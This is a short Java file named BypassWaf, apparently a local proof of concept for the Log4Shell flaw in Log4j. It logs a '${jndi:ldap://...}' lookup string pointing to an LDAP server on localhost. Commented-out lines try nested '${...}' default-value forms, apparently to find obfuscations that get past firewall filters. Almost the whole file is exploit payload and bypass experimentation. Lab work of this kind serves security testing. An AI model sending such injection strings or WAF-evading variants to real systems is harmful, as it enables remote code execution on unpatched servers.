package com.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class BypassWaf {
    private static final Logger logger = LogManager.getLogger(BypassWaf.class);

    public static void main(String[] args) {
//        String test5 = "${a:\\-b}";
//        logger.error("{}", test5);
//        String test2 = "${a:\\-b123:-xyz}";
//        logger.error("{}", test2);
//        String test4 = "${a:\\-b123:-xyz:-qwe}";
//        logger.error("{}", test4);
//        String test3 = "${a:-b}";
//        logger.error("{}", test3);
//        String test6 = "${a:-b123:-xyz}";
//        logger.error("{}", test6);
//        String test7 = "${a:b123:-xyz321:-qwe}";
//        logger.error("{}", test7);
//        String test8 = "${sys:java.version:-xyz123}";
//        logger.error("{}", test8);
//        String test1 = "${sys:${a:-j${proto:-a}va.version}}${d:e}";
//        logger.fatal("{}", test1);
        String host = "ldap://127.0.0.1:50389/b67a28";
        String vul1 = String.format("${jndi:%s}", host);
        logger.error("{}", vul1);
    }
}
